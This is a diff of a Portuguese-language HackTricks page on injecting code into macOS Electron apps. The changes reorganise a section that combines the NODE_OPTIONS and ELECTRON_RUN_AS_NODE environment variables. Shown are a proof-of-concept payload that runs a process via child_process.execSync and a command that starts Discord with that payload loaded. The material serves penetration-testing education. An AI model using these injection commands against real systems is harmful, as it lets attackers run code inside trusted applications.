@@ -12,11 +12,27 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 {% endcode %}
 
 {% hint style="danger" %}
-Observe que agora a maioria das aplicações Electron ignorará os parâmetros do node (como --inspect) quando iniciados, a menos que a variável de ambiente **`ELECTRON_RUN_AS_NODE`** seja definida.
+Observe que agora as aplicações Electron **fortalecidas** ignorarão os parâmetros do node (como --inspect) quando iniciadas, a menos que a variável de ambiente **`ELECTRON_RUN_AS_NODE`** seja definida.
 
-No entanto, ainda é possível usar o parâmetro do electron `--remote-debugging-port=9229`, mas a carga útil anterior não funcionará para executar outros processos.
+No entanto, ainda é possível usar o parâmetro electron `--remote-debugging-port=9229`, mas a carga útil anterior não funcionará para executar outros processos.
 {% endhint %}
 
+## `NODE_OPTIONS`
+
+{% hint style="warning" %}
+Esta variável de ambiente só funcionará se a aplicação Electron não tiver sido devidamente fortalecida e estiver permitindo isso. Se fortalecida, você também precisará usar a **variável de ambiente `ELECTRON_RUN_AS_NODE`**.
+{% endhint %}
+
+Com essa combinação, você pode armazenar a carga útil em um arquivo diferente e executar esse arquivo:
+
+{% code overflow="wrap" %}
+```bash
+# Content of /tmp/payload.js
+require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Ca$
+
+# Execute
+NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
+```
 ## `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>
 
 De acordo com [**a documentação**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), se essa variável de ambiente for definida, ela iniciará o processo como um processo Node.js normal. 
@@ -54,20 +70,6 @@ Como [**proposto aqui**](https://www.trustedsec.com/blog/macos-injection-via-thi
 </dict>
 </plist>
 ```
-### `ELECTRON_RUN_AS_NODE` & `NODE_OPTIONS` &#x20;
-
-Com essa combinação, você pode armazenar o payload em um arquivo diferente e executar esse arquivo:
-
-{% code overflow="wrap" %}
-```bash
-# Content of /tmp/payload.js
-require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Ca$
-
-# Execute
-NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
-```
-{% endcode %}
-
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
